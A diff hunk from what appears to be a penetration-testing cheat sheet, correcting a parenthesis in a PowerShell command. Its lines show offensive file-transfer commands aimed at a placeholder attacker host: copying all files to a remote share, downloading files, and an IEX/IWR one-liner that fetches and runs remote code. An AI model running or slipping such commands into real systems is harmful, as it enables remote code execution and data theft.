@@ -562,7 +562,7 @@ copy * \\<LHOST>\<SHARE>
 
 ```c
 iwr <LHOST>/<FILE> -o <FILE>
-IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing)
+IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
 powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
 ```
 
